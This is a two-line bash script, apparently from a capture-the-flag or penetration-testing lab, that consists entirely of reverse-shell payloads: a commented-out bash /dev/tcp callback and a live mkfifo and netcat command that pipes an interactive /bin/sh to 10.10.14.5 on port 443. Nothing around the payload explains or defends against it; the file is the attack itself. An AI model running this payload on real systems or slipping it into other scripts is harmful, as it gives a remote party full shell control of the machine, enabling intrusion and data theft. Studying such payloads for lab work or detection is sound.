#!/bin/bash
#bash -i >& /dev/tcp/10.10.14.5/443 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f
